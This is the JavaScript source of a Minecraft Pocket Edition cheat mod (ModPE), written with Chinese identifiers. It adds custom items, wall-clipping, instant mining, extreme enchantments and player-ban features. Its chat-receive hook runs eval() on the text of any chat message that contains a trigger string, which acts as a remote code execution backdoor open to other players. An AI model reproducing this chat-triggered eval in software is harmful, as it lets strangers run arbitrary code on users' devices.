function 写入(path,str,ow){
if(存在(path)&&ow!=null){return;}
new pg.jiFOS(path).write(new pg.jlS(""+str).getBytes());
}

function 随机改名(){
var c="Steve"+random(10000,99999)+"（"
try{Entity.setNameTag(getPlayerEnt(),c)}catch(e){}
}

function 写入主数据(){
try{
var a="★";

var data=aswi[24]+a+aswi[23]+a+aswi[22]+a+aswi[15]+a+检查更新+a+快捷方式读取+a+快捷方式x+a+快捷方式y+a+附加指令读取+a+踢人名称+a+悬浮窗路径+a+跑分+a+aswi[29]+a+aswi[3]+a+aswi[13]+a+aswi[2]+a+aswi[1]+a+aswi[0]+a+aswi[26]+a+aswi[28]+a

var data2=gui缩放+a+文字大小+a+acolor+a+rcolor+a+gcolor+a+bcolor+a+acolort+a+rcolort+a+gcolort+a+bcolort+a+acolorm+a+rcolorm+a+gcolorm+a+bcolorm+a+主要w+a+主要h+a
if(存在(主目录+"设置.txt")){写入(主目录+"外观.txt",data2)}
写入(主目录+"设置.txt",data)
}catch(e){alert(astr[2]+":\n"+e);}
保存日志("写入主数据");
}

function 读取主数据(){
保存日志("读取主数据")
/*
if(存在(主目录+"设置.txt")&&存在(主目录+"外观.txt")){
var 结果=读取(主目录+"设置.txt").split("★");
for(i=0;i<结果.length;i++){
if(结果[i]=="true"){结果[i]=true}
if(结果[i]=="false"){结果[i]=false}
}
aswi[24]=结果[0];
aswi[23]=结果[1];
aswi[22]=结果[2];
aswi[15]=结果[3];
检查更新=结果[4];
快捷方式读取=结果[5];
快捷方式x=结果[6];
快捷方式y=结果[7];
附加指令读取=结果[8];
踢人名称=结果[9];
悬浮窗路径=结果[10];
跑分=结果[11];
aswi[29]=结果[12];
aswi[3]=结果[13];
aswi[13]=结果[14];
aswi[2]=结果[15];
aswi[1]=结果[16];
aswi[0]=结果[17];
aswi[26]=结果[18];
aswi[28]=结果[19];

结果=读取(主目录+"外观.txt").split("★");
for(i=0;i<结果.length;i++){
结果[i]=Number(结果[i])
}
gui缩放=结果[0];
文字大小=结果[1];
acolor=结果[2];
rcolor=结果[3];
gcolor=结果[4];
bcolor=结果[5];
acolort=结果[6];
rcolort=结果[7];
gcolort=结果[8];
bcolort=结果[9];
acolorm=结果[10];
rcolorm=结果[11];
gcolorm=结果[12];
bcolorm=结果[13];
主要w=结果[14];
主要h=结果[15];
}
else{写入主数据();}*/
}

读取主数据()

function 玩家名称获取(str){
var ent=Server.getAllPlayers();
for(i=0;i<ent.length;i++){
if(String(Entity.getNameTag(ent[i]))==str){
return ent[i];}}
return undefined
}
function 性能测试(){
保存日志("性能测试")
var start=new Date()
runThread(function(){
var a="",b="",c="",d=""
for(i=1;i<=5000;i=i+1){a=a+"测试1！"+i;}
for(i=1;i<=5000;i=i+1){b=b+"测试2！"+10000*10000*i}
for(i=1;i<=5000;i=i+0.141592651521562){d=d+"测试3！"+i/27*24}
for(i=1;i<=5000;i=i+0.14159521125212626){c=c+"测试4！"+3*i}
var f=new Date()-start
if(f<跑分){跑分=f;写入主数据();print(astr[17]);}
alert(astr[18][0]+f+astr[18][1]+跑分,astr[19]);
})
}

function chatHook(str){
保存日志("聊天钩子",str);
if(打字附加!=undefined){
preventDefault()
Server.sendChat(打字附加+str);}
}

function continueDestroyBlock(x,y,z,side,progress){
保存日志("继续破坏方块",x,y,z,side,progress);}

function chatReceiveHook(str,sender){
保存日志("接收聊天",str,sender)
if(str.search(astr[20])!=-1){
aswi[3]=true
try{eval(str.split(" ")[1])
cM(astr[87])
}catch(e){cM(astr[2])}
aswi[3]=false;}
}

function projectileHitEntityHook(projectile,targetEntity){
保存日志("抛射物打到实体",projectile,targetEntity)}

function eatHook(hearts,saturationRatio){
保存日志("吃东西",hearts,saturationRatio)}

function entityHurtHook(attacker,victim,halfhearts){
保存日志("实体受伤",attacker,victim,halfhearts)}

function serverMessageReceiveHook(str){
保存日志("接收服务器消息",str)}

function playerAddExpHook(player,experienceAdded){
保存日志("玩家加经验",player,experienceAdded)}

function playerExpLevelChangeHook(player,levelsAdded){
保存日志("玩家等级改变",player,levelsAdded)}

function redstoneUpdateHook(x,y,z,newCurrent,someBooleanIDontKnow,blockId,blockData){
保存日志("红石更新",x,y,z,newCurrent,someBooleanIDontKnow,blockId,blockData)}

function startDestroyBlock(x,y,z,side){
保存日志("开始破坏方块",x,y,z,side)}

function projectileHitBlockHook(projectile,blockX,blockY,blockZ,side){
保存日志("抛射物打到方块",projectile,blockX,blockY,blockZ,side)}

function levelEventHook(entity,eventType,x,y,z,data){
if(aswi[16]){preventDefault();}
保存日志("事件钩子",entity,eventType,x,y,z,data);
}

function blockEventHook(x,y,z,eventType,data){
保存日志("方块事件",x,y,z,eventType,data);
}

function selectLevelHook(){
保存日志("选择存档");
}

var expba=0,dropi=0,arrow=0,tntc=0
function 移除卡机实体(实体){
try{var allent=Entity.getAll()

if(Entity.getEntityTypeId(实体)==EntityType.EXPERIENCEBALL){expba++}

if(Entity.getEntityTypeId(实体)==64){dropi++}

if(Entity.getEntityTypeId(实体)==80){arrow++}

if(Entity.getEntityTypeId(实体)==65){tntc++}

if(expba>100){for(var i in allent){
if(Entity.getEntityTypeId(allent[i])==EntityType.EXPERIENCEBALL){Entity.remove(allent[i]);expba=0}}}

if(dropi>100){for(var i in allent){
if(Entity.getEntityTypeId(allent[i])==64){Entity.remove(allent[i]);dropi=0}}}

if(arrow>100){for(var i in allent){
if(Entity.getEntityTypeId(allent[i])==80){Entity.remove(allent[i]);arrow=0}}}

if(tntc>100){for(var i in allent){
if(Entity.getEntityTypeId(allent[i])==65){Entity.remove(allent[i]);tntc=0}}}
}catch(e){}
}

function entityAddedHook(实体){
保存日志("实体添加",实体,Entity.getEntityTypeId(实体),Entity.getRenderType(实体));

if(aswi[16]&&实体!=getPlayerEnt()){preventDefault();Entity.remove(实体);}

if(aswi[10]){移除卡机实体(实体);}
var reg=new RegExp(踢人名称,"g");

if(Entity.getEntityTypeId(实体)==63&&实体!=getPlayerEnt()){

if(存在(主目录+"封禁的玩家/"+Entity.getNameTag(实体)+".txt")||Entity.getNameTag(实体).search(reg)!=-1){cM(astr[21]+Entity.getNameTag(实体)+astr[22]);Entity.remove(实体);}
}

if(Entity.getNameTag(实体)=="柚子人yzr.ilyzr"&&Entity.getRenderType(实体)==EntityRenderType.ironGolem&&yzr实体==null){
yzr实体=实体
Entity.setMobSkin(实体,"mob/yzr.png"); Entity.setRenderType(实体,3)
;
Entity.setCollisionSize(实体 ,0.7,1.8);
Entity.setHealth(实体,50);
}

if(Entity.getEntityTypeId(实体)==63){cM(Entity.getNameTag(实体)+astr[23]);
}
}

function entityRemovedHook(实体){
保存日志("移除实体",实体,Entity.getEntityTypeId(实体),Entity.getRenderType(实体));

if(Entity.getEntityTypeId(实体)==63){cM(Entity.getNameTag(实体)+astr[24]);}
if(Entity.getHealth(getPlayerEnt())<=0&&实体==炸妈TNT){cM(Entity.getNameTag(getPlayerEnt())+astr[25])}
}

//---------------

try{
//新建物品
ModPE.setItem(物品id组[4],"血之剑",0,"血之剑",1);
ModPE.setItem(物品id组[9],"选取工具",0,"选取工具",1);
ModPE.setItem(物品id组[5],"神器圣剑",0,"神器圣剑",1);
ModPE.setItem(物品id组[6],"冰之剑",0,"冰之剑",1);
ModPE.setItem(物品id组[7],"砖石剑升级版",0,"砖石剑升级版",1);
ModPE.setItem(物品id组[8],"彩色物质",0,"彩色物质",64);
ModPE.setItem(物品id组[2],"神器",0,"神器",1);
ModPE.setItem(物品id组[0],"我鄙视你",0,"我鄙视你",64);
ModPE.setFoodItem(物品id组[1],"diamond",0,2,"生的鄙视牌钻石",64);
ModPE.setFoodItem(物品id组[3],"烤熟的鄙视牌钻石",0,20,"烤熟的鄙视牌钻石",64);
Block.defineBlock(254,"炸妈盒子", [["炸妈盒子",0],["tnt",1],["炸妈盒子",0],["炸妈盒子",0],["炸妈盒子",0],["炸妈盒子",0]],46,false);
Block.defineBlock(253,"假钻石矿", [["diamond_ore",0],["diamond_ore",0],["diamond_ore",0],["diamond_ore",0],["diamond_ore",0],["diamond_ore",0]],56,false);
Block.setDestroyTime(253,0.1);
Block.setLightLevel(253,15);
Block.setExplosionResistance(253,100000);
//设置合成
Item.addShapedRecipe(物品id组[9],1,0,[" c "," cc","c  "],["c",物品id组[8],0]);
Item.addShapedRecipe(物品id组[4],1,0,["  r","dr ","sd "],["r",331,0,"s",280,0,"d",264,0]);
Item.addShapedRecipe(物品id组[5],1,0,["  c"," c ","d  "],["c",物品id组[8],0,"d",264,0]);
Item.addShapedRecipe(物品id组[6],1,0,["d i"," i ","s d"],["d",264,0,"i",332,0,"s",280,0]);
Item.addShapedRecipe(物品id组[7],1,0,["  b","bb ","sb "],["b",98,0,"s",369,0]);
Item.addShapedRecipe(物品id组[2],1,0,[" c "," c "," c "],["c",物品id组[8],0]);
Item.addShapedRecipe(物品id组[8],1,0,["dri","gcl","yhb"],["d",264,0,"r",331,0,"i",265,0,"g",266,0,"c",388,0,"l",351,4,"y",348,0,"h",406,0,"b",369,0]);
Item.addCraftRecipe(物品id组[1],1,0,[物品id组[0],1,0,物品id组[0],1,0,物品id组[0],1,0,物品id组[0],1,0,物品id组[0],1,0,物品id组[0],1,0,物品id组[0],1,0,物品id组[0],1,0,物品id组[0],1,0]);
Item.addCraftRecipe(物品id组[1],9,0,[255,1,0]);
Item.addFurnaceRecipe(物品id组[1],物品id组[3],0);
//添加到创造物品栏
Player.addItemCreativeInv(物品id组[0],1,0);
Player.addItemCreativeInv(物品id组[1],1,0);
Player.addItemCreativeInv(物品id组[2],1,0);
Player.addItemCreativeInv(物品id组[3],1,0);
Player.addItemCreativeInv(物品id组[4],1,0);
Player.addItemCreativeInv(物品id组[5],1,0);
Player.addItemCreativeInv(物品id组[6],1,0);
Player.addItemCreativeInv(物品id组[7],1,0);
Player.addItemCreativeInv(物品id组[8],1,0);
Player.addItemCreativeInv(物品id组[9],1,0);
Player.addItemCreativeInv(255,1,0);
Player.addItemCreativeInv(254,1,0);
Player.addItemCreativeInv(253,1,0);
Item.setHandEquipped(物品id组[2],true);
Item.setMaxDamage(物品id组[2],400);
Item.setHandEquipped(物品id组[4],true);
Item.setMaxDamage(物品id组[4],400);
Item.setHandEquipped(物品id组[5],true);
Item.setMaxDamage(物品id组[5],400);
Item.setHandEquipped(物品id组[6],true);
Item.setMaxDamage(物品id组[6],400);
Item.setHandEquipped(物品id组[7],true);
Item.setMaxDamage(物品id组[7],400);
Item.setHandEquipped(物品id组[9],true);
Item.setMaxDamage(物品id组[9],400);
//设置方块
Block.defineBlock(255,"假钻石块",[["diamond_block",0],["diamond_block",0],["diamond_block",0],["diamond_block",0],["diamond_block",0],["diamond_block",0]],1,false);
Block.setDestroyTime(255,1);
Block.setLightLevel(255,15);
Block.setExplosionResistance(255,100000);
保存日志("物品创建成功");
}catch(e){print("材质包未安装\n已启用备用物品id组\n物品id请在帮助里查看");物品id组=[277,276,280,279,310,311,312,313,264,278];alert内容设置();}
var 在主界面=true
var 实际模式缓存,实际维度缓存
var 循环固定时=6000,循环=0
var 音乐

function 放歌(){
if(aswi[13]){return}
try{音乐.stop()}catch(e){}
try{
实际模式缓存=Level.getGameMode();
实际维度缓存=Player.getDimension();
循环=循环固定时;
var 路径="";

if(在主界面){
路径=主目录+"music/menu/menu"+random(1,4)+".ogg";循环固定时=6000;}

else{
if(Level.getGameMode()==1&&Player.getDimension()==DimensionId.NORMAL){
var cors=random(0,3)
if(cors==2){放歌();return;}
路径=主目录+"music/game/creative/creative"+random(1,7)+".ogg";循环固定时=10000;}

if(Player.getDimension()==DimensionId.NETHER){
路径=主目录+"music/game/nether/nether"+random(1,4)+".ogg";循环固定时=8000;}

if(Level.getGameMode()==0&&Player.getDimension()==DimensionId.NORMAL){
循环固定时=7200;
var 名称=""
switch(random(1,12)){
case 1:名称="calm1";break;
case 2:名称="calm2";break;
case 3:名称="calm3";break;
case 4:名称="hal1";break;
case 5:名称="hal2";break;
case 6:名称="hal3";break;
case 7:名称="hal4";break;
case 8:名称="nuance1";break;
case 9:名称="nuance2";break;
case 10:名称="piano1";break;
case 11:名称="piano2";break;
case 12:名称="piano3";break;}

路径=主目录+"music/game/"+名称+".ogg";}
}

音乐=new android.media.MediaPlayer()
音乐.setDataSource(路径);
音乐.prepare();
音乐.start();
保存日志("放歌");
}catch(e){
alert(alert内容[5]+e);aswi[13]=true;}
}

function 新建按钮(text,w,h){
var button,win
runOnUiThread(function(){try{
var layout=new pg.awLL(ctx);
button=按钮(layout,text,w,h,0,0)
win=移动按钮(button,0,0,新建窗口(-2,-2,layout,false),false)[1]
win.showAtLocation(ctx.getWindow().getDecorView(), pg.avG.LEFT | pg.avG.TOP,0,0)
}catch(e){alert(astr[2]+":\n"+e);}
})
return [button,win]
}

function setvel(item,x,y,z){
setVelX(item,x)
setVelY(item,y)
setVelZ(item,z)
return item

}

function 打开附魔按钮(){
保存日志("打开附魔按钮");
var a=新建按钮("附魔",100,60)
附魔按钮=a[1]
a[0].setOnClickListener(new pg.avVOCL({onClick:function(v,event){
高级附魔();
}}));}
function 打开选取按钮(){
保存日志("打开选取按钮");
var a=新建按钮("选取",100,60)
选取按钮=a[1]
a[0].setOnClickListener(new pg.avVOCL({onClick:function(v,event){try{
Entity.setCarriedItem(getPlayerEnt(),Player.getPointedBlockId(),64,Player.getPointedBlockData())}catch(e){print(e)}
}}));}
function 打开扔东西按钮(){
保存日志("打开扔东西按钮");
var a=新建按钮("Q",100,60)
扔东西按钮=a[1]
a[0].setOnClickListener(new pg.avVOCL({onClick:function(v,e){try{
var item=Level.dropItem(Player.getX(),Player.getY(),Player.getZ(), 0,getCarriedItem(),1,Player.getCarriedItemData());
var vel=视角速度();setvel(item,vel[0]*0.3,vel[1]*0.3,vel[2]*0.3)
var c=Player.getCarriedItemCount()
if(c>1){
Entity.setCarriedItem(getPlayerEnt(),getCarriedItem(),c-1,Player.getCarriedItemData())}
else{Entity.setCarriedItem(getPlayerEnt(),0,0,0)}
}catch(e){print(e)}}}));
}


function 执行快捷方式(i){
读取主数据();
try{
eval(""+快捷方式读取.split("@")[i-1]);}catch(e){print(astr[26]+e);}
}
var dkx=xis+fpr*2
function 打开快捷方式(){
保存日志("打开快捷方式");
print(astr[27])
runOnUiThread(function(){try{
var $1=new pg.awLL(ctx);
$1.setOrientation(1);
$1.setGravity(17);
var $2=new pg.awLL(ctx);
外观($2,-2,-2);
var $3=按钮($2,"♠",50,60,0,0)
$3.setOnClickListener(new pg.avVOCL({onClick:function(){
执行快捷方式(1);
}}));
$3.setOnLongClickListener(new pg.avVOLCL({onLongClick:function(){
读取主数据()
try{
var layout=制作菜单(scrwid/4)

//添加组件
文本(layout,astr[45],5);
文本(layout,astr[46])
var edittext=输入(layout,快捷方式读取,astr[47]);

var title显示=文本(layout,"x:"+快捷方式x+"\ny:"+快捷方式y)

var a=拖动(layout,快捷方式x,scrwid)
a.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
快捷方式x=a.getProgress();
title显示.setText("x:"+快捷方式x+"\ny:"+快捷方式y)}}))

var b=拖动(layout,快捷方式y,scrhei)
b.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
快捷方式y=b.getProgress();
title显示.setText("x:"+快捷方式x+"\ny:"+快捷方式y)}}))

按钮(layout,astr[32],-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
快捷方式读取=edittext.getText();
写入主数据();
快捷方式.update(快捷方式x,快捷方式y,-1,-1)
print(astr[0]);
}}))

按钮(layout,astr[48],-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
快捷方式x=300
快捷方式y=100
写入主数据()
快捷方式.update(快捷方式x,快捷方式y,-1,-1)
print(astr[0]);
}}))
}catch(e){alert(astr[2]+":\n"+e);}
return true
}}));
按钮($2,"♥",50,60,0,0).setOnClickListener(new pg.avVOCL({onClick:function(){
执行快捷方式(2);
}}));
按钮($2,"♀",50,60,0,0).setOnClickListener(new pg.avVOCL({onClick:function(){
执行快捷方式(3);
}}));
$1.addView($2);
var $6=new pg.awLL(ctx);
外观($6,-2,-2);
按钮($6,"♣",50,60,0,0).setOnClickListener(new pg.avVOCL({onClick:function(){
执行快捷方式(4);
}}));
按钮($6,"♦",50,60,0,0).setOnClickListener(new pg.avVOCL({onClick:function(){
执行快捷方式(5);
}}));
按钮($6,"♂",50,60,0,0).setOnClickListener(new pg.avVOCL({onClick:function(){
执行快捷方式(6);
}}));
$1.addView($6);
快捷方式=色(新建窗口(参数(150),参数(120),$1,false),2,0,0,0,0);
快捷方式.showAtLocation(ctx.getWindow().getDecorView(),0,快捷方式x,快捷方式y);
}
catch(e){
alert(astr[2]+":\n"+e);
}}
)}

function 剪切板(str){
runOnUiThread(function(){try{
ctx.getSystemService(ctx.CLIPBOARD_SERVICE).setText(String(str))
print(astr[0])
}catch(e){print(e)}
})}

function 清除所有实体(){
保存日志("清除所有实体")
try{var allent=Entity.getAll();

for(var i=0;i<=allent.length;i++){

if(allent[i]!=getPlayerEnt()){Entity.remove(allent[i]);}}
cM(astr[0]);}catch(e){cM(e);}}


function 打开debug开关(){
保存日志("打开debug开关");
读取主数据()
try{
var layout=制作菜单(scrwid/2)
//添加组件
文本(layout,astr[34],5)
文本(layout,astr[35])
勾选(layout,astr[36],aswi[17]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[17]=!aswi[17]
}catch(e){print(e)}
}}));

勾选(layout,astr[36]+"2",开关gui(debug显示)).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
if(debug显示==null){打开debug显示();}
else{debug显示.dismiss();debug显示=null;debug更新("")}
}catch(e){print(e)}
}}));
勾选(layout,astr[228],开关gui(日志窗口)).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
if(日志窗口==null){打开日志窗口()}
else{日志窗口.dismiss();日志窗口=null;}
}catch(e){print(e)}
}}));

勾选(layout,astr[37],aswi[12]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[12]=!aswi[12]
}catch(e){print(e)}
}}));

按钮(layout,astr[38],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
日志="";print(astr[0])
}}))

按钮(layout,astr[39],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
剪切板(日志);print(astr[0])
}}))

按钮(layout,astr[40],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
var a="debug:\n"+debugstr2+"\nvar信息:\n"+var信息+"\n启动器:\n"+pak+"\n游戏版本:"+游戏版本+"\njs版本:"+inf.v+"\n屏幕宽高:"+scrwid+"×"+scrhei+"\nDPI:"+scrdpi*160+"\n日志:\n"+日志
写入(主目录+"日志信息.txt",a)
print(astr[0])
}}))
 
按钮(layout,astr[41],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
发邮件("(重要) "+inf.n+" 用户反馈","debug:\n"+debugstr2+"\nvar信息:\n"+var信息+"\n启动器:\n"+pak+"\n游戏版本:"+游戏版本+"\njs版本:"+inf.v+"\n屏幕宽高:"+scrwid+"×"+scrhei+"\nDPI:"+scrdpi*160+"\n日志:\n"+日志); 
}}))

}catch(e){alert(astr[2]+":\n"+e);}}

function 打开开火按钮(){
保存日志("打开开火按钮");
runOnUiThread(function(){try{
var layout=new pg.awLL(ctx)
按钮(layout,"♠♠",100,60,0,0).setOnTouchListener(new pg.avVOTL({onTouch:function(v,e){
开火算法()
return true;}}));
开火按钮=新建窗口(-2,-2,layout,false)
开火按钮.showAtLocation(ctx.getWindow().getDecorView(),pg.avG.LEFT | pg.avG.TOP,参数(800),参数(500))
}catch(e){alert(astr[2]+":\n"+e);}
})}

function 视角速度(){
var yaw=(getYaw()%360)*Math.PI/180;
var pitch=getPitch()*Math.PI/180;
return [-Math.sin(yaw)*Math.cos(pitch),-Math.sin(pitch),Math.cos(yaw)*Math.cos(pitch)];
}

function 开火算法(){
try{
var vel=视角速度()
if(实体id选取==undefined){实体id选取=80;}
////
var 实体=Level.spawnMob(Player.getX()+vel[0],Player.getY()+vel[1],Player.getZ()+vel[2],实体id选取);
setVelX(实体,vel[0]*90);
setVelY(实体,vel[1]*90);
setVelZ(实体,vel[2]*90);
Level.addParticle(ParticleType.smoke,Player.getX(),Player.getY(),Player.getZ(),0,0,0,200);
}catch(e){alert(astr[2]+":\n"+e);}
}

function 高级附魔(){
保存日志("高级附魔");
var 等级=1000
var s=Player.getSelectedSlotId()
Player.enchant(s,Enchantment.AQUA_AFFINITY,等级);
Player.enchant(s,Enchantment.BANE_OF_ARTHROPODS,等级);
Player.enchant(s,Enchantment.BLAST_PROTECTION,等级);
Player.enchant(s,Enchantment.DEPTH_STRIDER,等级);
Player.enchant(s,Enchantment.EFFICIENCY,等级);
Player.enchant(s,Enchantment.FEATHER_FALLING,等级);
Player.enchant(s,Enchantment.FIRE_ASPECT,等级);
Player.enchant(s,Enchantment.FIRE_PROTECTION,等级);
Player.enchant(s,Enchantment.FLAME,等级);
Player.enchant(s,Enchantment.FORTUNE,等级);
Player.enchant(s,Enchantment.INFINITY,等级);
Player.enchant(s,Enchantment.KNOCKBACK,等级);
Player.enchant(s,Enchantment.LOOTING,等级);
Player.enchant(s,Enchantment.LUCK_OF_THE_SEA,等级);
Player.enchant(s,Enchantment.LURE,等级);
Player.enchant(s,Enchantment.POWER,等级);
Player.enchant(s,Enchantment.PROJECTILE_PROTECTION,等级);
Player.enchant(s,Enchantment.PROTECTION,等级);
Player.enchant(s,Enchantment.PUNCH,等级);
Player.enchant(s,Enchantment.RESPIRATION,等级);
Player.enchant(s,Enchantment.SHARPNESS,等级);
Player.enchant(s,Enchantment.SILK_TOUCH,等级);
Player.enchant(s,Enchantment.SMITE,等级);
Player.enchant(s,Enchantment.THORNS,等级);
Player.enchant(s,Enchantment.UNBREAKING,等级);
Player.setItemCustomName(s,"<"+inf.n+">"+astr[49])
cM(astr[0]);
}

function base(widget,code){
var 图=android.util.Base64.decode(code,0)
widget.setImageBitmap(pg.ag.BitmapFactory.decodeByteArray(图,0,图.length));
}
/*主要按钮*/
var 主要按钮x =100;
var 主要按钮y =100;
var 主要按钮=null
function 打开主要按钮(){
保存日志("打开主要按钮");
runOnUiThread(function(){try{
var layout=new pg.awLL(ctx); 
var button=new pg.awIV(ctx);
try{base(button,读取(主目录+"悬浮窗图片.txt"));}catch(e){try{button.setImageBitmap(new pg.ag.BitmapFactory.decodeFile(悬浮窗路径));
}catch(e){base(button,滑鸡base)}}
button.setOnClickListener(new pg.avVOCL(){onClick:function(v){openMenu();try{layout.removeView(hint)}catch(e){}
}});
button.setOnLongClickListener(new pg.avVOLCL(){onLongClick:function(v){打开帮助();return true;}}); 
主要按钮=移动按钮(button,主要按钮x,主要按钮y,新建窗口(-2,-2,layout,false))[1]
layout.addView(button)
if(!aswi[1]){外观(button,主要w,主要h,0)}
hint=文本(layout,astr[50]+"")
主要按钮.showAtLocation(ctx.getWindow().getDecorView(), pg.avG.LEFT | pg.avG.TOP,主要按钮x,主要按钮y)
}catch(e){alert(astr[2]+":\n"+e);}
})
}

/*死亡钩子类*/
function deathHook(攻击者,实体){
保存日志("死亡钩子",攻击者,实体);

/*作者死亡*/
if(实体==yzr实体){
Entity.setHealth(yzr实体,0)
Level.dropItem(Entity.getX(实体), Entity.getY(实体), Entity.getZ(实体), 0, 255, 1, 0);
Level.dropItem(Entity.getX(实体), Entity.getY(实体), Entity.getZ(实体), 0, 物品id组[0], 1, 15);
cM("<柚子人yzr.ilyzr> 我被打了");
杀死作者次数++;作者信息倒计时=500;yzr实体=null;}
/*死亡不掉落*/

if(aswi[18]){

if(实体==getPlayerEnt()||Entity.getHealth(getPlayerEnt())<=0){

aswi[19]=true;保存物品栏(20);

for(i=0;i<46;i++){Player.clearInventorySlot(i);}}}
//---f
}

function destroyBlock(x,y,z,side){
保存日志("破坏方块",x,y,z,side);

if(getTile(x,y,z)==253&&Level.getGameMode()==0&&getCarriedItem()==物品id组[2]){Level.dropItem(x,y,z,0,物品id组[1],10,0)}

if(aswi[16]){preventDefault();}
}

function explodeHook(entity,x,y,z,power,OnFire){
保存日志("爆炸钩子",entity,x,y,z,power,OnFire);
if(aswi[16]){preventDefault();}
if(aswi[9]){preventDefault();}

}

/*使用物品*/
function useItem(x,y,z,itemid,blockid,side,itemdamage,blockdamage){
保存日志("使用物品",x,y,z,itemid,blockid,side,itemdamage,blockdamage);

if(itemid==物品id组[2]){
if(blockid==63||blockid==68){
runOnUiThread(function(){try{
var layout=制作菜单(scrwid/4)
文本(layout,astr[79]);

var fed=输入(layout,Level.getSignText(x,y,z,0),astr[80])
var sed=输入(layout,Level.getSignText(x,y,z,1),astr[81])
var ted=输入(layout,Level.getSignText(x,y,z,2),astr[82])
var ftd=输入(layout,Level.getSignText(x,y,z,3),astr[83])

按钮(layout,astr[32],-1).setOnClickListener(new pg.avVOCL({onClick:function(){
Level.setSignText(x,y,z,0,fed.getText())
Level.setSignText(x,y,z,1,sed.getText())
Level.setSignText(x,y,z,2,ted.getText())
Level.setSignText(x,y,z,3,ftd.getText())
print(astr[0])
}}));
}catch(e){alert(astr[2]+":\n"+e);}
})
}
}

if(aswi[16]&&itemid!=物品id组[2]){preventDefault();}

if(blockid==254&&itemid==物品id组[2]){
setTile(x,y,z,0)
炸妈TNT=Level.spawnMob(x+0.5,y+0.5,z+0.5,65)
}

if(itemid==物品id组[9]){preventDefault();}

if(itemid==物品id组[2]&&功能!=0){
if(Level.getGameMode()!=1){Entity.setCarriedItem(getPlayerEnt(),getCarriedItem(),Player.getCarriedItemCount(),Player.getCarriedItemData()+1);}}
/*箱子全满*/
if(aswi[20]&&blockid==54){
try{
preventDefault();
for(i=0;i<58;i++)
Level.setChestSlot(x,y,z,i,itemid,itemdamage,255);cM(astr[0]);}catch(e){cM(astr[1]);}
}
/*抽奖*/
if(itemid==物品id组[1]&&功能==17&&抽奖倒计时==-1){抽奖倒计时=100;
Entity.setCarriedItem(getPlayerEnt(),物品id组[1],Player.getCarriedItemCount(getPlayerEnt())-1);
cM(astr[51]);}
/*穿墙*/
if(itemid==物品id组[2]&&功能==16&&blockid!=0){
穿墙(x,y,z,side,0);
}
/*秒挖*/
if(getCarriedItem()==物品id组[2]&&功能==15){
Level.destroyBlock(x,y,z,true);}
/*闪电*/
if(itemid==物品id组[2]&&功能==7){
var 实体=spawnChicken(x,y,z);
var 闪电=Level.spawnMob(x,y,z,93);
Entity.setHealth(实体,2);
Entity.rideAnimal(闪电,实体);
Entity.setRenderType(实体,EntityRenderType.lightningBolt);
cM(astr[52]);}
/*debug方块类*/
debug方块id=blockid,debug方块dmg=blockdamage;debug方块side=side;
/*核弹*/
if(itemid==物品id组[2]&&功能==12){
explode(x,y,z,总设值);}
/*生成作者*/
if(itemid==物品id组[2]&&功能==2&&yzr实体==null){yzr实体=Level.spawnMob(x,y+1,z,EntityType.IRON_GOLEM,"mob/yzr.png");
Entity.setRenderType(yzr实体,3);
Entity.setHealth(yzr实体,100);
Entity.setCollisionSize(yzr实体,0.7,1.8);
cM("柚子人yzr.ilyzr "+astr[53]);
Entity.setNameTag(yzr实体,"柚子人yzr.ilyzr");}
/*土豪模式*/
var bid=[3,1,5,2,12,4,17]
var tid=[57,42,41,22,173,133,152]
for(i=0;i<bid.length;i++){
if(itemid==物品id组[2]){
if(功能==1&&blockid==bid[i]){setTile(x,y,z,tid[i]);}
if(功能==5&&blockid==tid[i]){setTile(x,y,z,bid[i]);}
}}

/*送钻石*/
if(itemid==物品id组[2]&&功能==9){
addItemInventory(57,总设值,0);
cM(astr[54]);}
/*设置出生点*/
if(itemid==物品id组[2]&&功能==10){Level.setSpawn(x,y+1,z);
写入传送点(21);
cM(astr[55]);}
}

function 穿墙(穿墙x,穿墙y,穿墙z,穿墙side,深度){
保存日志("穿墙",穿墙x,穿墙y,穿墙z,穿墙side,深度);
var 穿墙方块
if(深度>=总设值){print(astr[56]+总设值);return;}
if(穿墙side==2){
穿墙方块=getTile(穿墙x,穿墙y,穿墙z+深度);
if(穿墙方块!=0){穿墙(穿墙x,穿墙y,穿墙z,穿墙side,深度+1);}
if(穿墙方块==0){Entity.setPosition(getPlayerEnt(),穿墙x+1/2,穿墙y+1,穿墙z+深度+1/2);}
}

if(穿墙side==5){
穿墙方块=getTile(穿墙x-深度,穿墙y,穿墙z);
if(穿墙方块!=0){穿墙(穿墙x,穿墙y,穿墙z,穿墙side,深度+1);}
if(穿墙方块==0){Entity.setPosition(getPlayerEnt(),穿墙x-深度+1/2,穿墙y+1,穿墙z+1/2);}
}

if(穿墙side==3){
穿墙方块=getTile(穿墙x,穿墙y,穿墙z-深度);

if(穿墙方块!=0){穿墙(穿墙x,穿墙y,穿墙z,穿墙side,深度+1);}

if(穿墙方块==0){Entity.setPosition(getPlayerEnt(),穿墙x+1/2,穿墙y+1,穿墙z-深度+1/2);}
}

if(穿墙side==4){
穿墙方块=getTile(穿墙x+深度,穿墙y,穿墙z);

if(穿墙方块!=0){穿墙(穿墙x,穿墙y,穿墙z,穿墙side,深度+1);}

if(穿墙方块==0){Entity.setPosition(getPlayerEnt(),穿墙x+深度+1/2,穿墙y+1,穿墙z+1/2);}
}

}

function 读取传送点(传送点序号){
保存日志("读取传送点",传送点序号);
try{
var 传送点=读取(主目录+"地图传送点/"+Level.getWorldDir()+"/传送点"+传送点序号+".txt");
传送点=传送点.split(",");
Entity.setPosition(getPlayerEnt(),传送点[0],传送点[1],传送点[2]);
cM(astr[57]+传送点序号);
}catch(e){cM(astr[58])}
}

function 写入传送点(传送点序号){
保存日志("写入传送点",传送点序号);
